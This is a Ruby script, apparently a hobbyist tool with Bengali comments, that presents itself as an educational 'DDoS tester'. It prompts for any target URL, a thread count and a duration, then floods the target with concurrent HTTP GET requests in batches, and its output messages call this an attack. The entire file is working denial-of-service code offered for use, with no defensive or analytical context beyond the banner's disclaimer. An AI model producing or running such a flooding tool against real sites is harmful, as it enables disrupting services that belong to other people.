require 'net/http'
require 'uri'
require 'thread'

# 🅰️ ব্যানার সরাসরি স্ক্রিপ্টে
def show_banner
  puts <<-'BANNER'
██████╗ ██╗   ██╗██████╗ ██╗   ██╗    ██████╗ ██████╗  ██████╗ ███████╗███████╗████████╗███████╗██████╗ 
██╔══██╗██║   ██║██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██║   ██║██████╔╝ ╚████╔╝     ██████╔╝██████╔╝██║   ██║█████╗  █████╗     ██║   █████╗  ██████╔╝
██╔═══╝ ██║   ██║██╔═══╝   ╚██╔╝      ██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  ██╔══╝     ██║   ██╔══╝  ██╔══██╗
██║     ╚██████╔╝██║        ██║       ██║     ██║     ╚██████╔╝███████╗███████╗   ██║   ███████╗██║  ██║
╚═╝      ╚═════╝ ╚═╝        ╚═╝       ╚═╝     ╚═╝      ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
        🔺 RUBY DDoS TESTER - FOR EDUCATIONAL USE ONLY 🔺
                   🔸 Made by MD Abdullah 🔸
  BANNER
end

# ▶️ ব্যানার দেখাও
show_banner

# 🟩 ইনপুট
print "🌐 Target URL (e.g., https://example.com): "
target = gets.strip

print "🔁 Threads to use: "
max_threads = gets.strip.to_i

print "⏱️ Duration in seconds: "
duration = gets.strip.to_i

# 🧮 সিস্টেম সীমা
FD_LIMIT = 1024
BATCH_SIZE = [FD_LIMIT - 50, 500].min
start_time = Time.now

# ✅ ফাংশন: সিঙ্গেল রিকুয়েস্ট
def send_request(target)
  uri = URI.parse(target)
  Net::HTTP.get(uri)
rescue
  nil
end

# ✅ ব্যাচ চালানো
def run_batch(target, count)
  threads = []
  count.times do
    threads << Thread.new { send_request(target) }
  end
  threads.each(&:join)
end

puts "\n🚀 Starting attack on #{target} with #{max_threads} threads for #{duration} seconds...\n\n"

begin
  while Time.now - start_time < duration
    batch = [max_threads, BATCH_SIZE].min
    run_batch(target, batch)
    max_threads -= batch
    break if max_threads <= 0
  end
rescue Interrupt
  puts "\n🛑 Attack stopped by user."
end

puts "✅ Attack complete!"
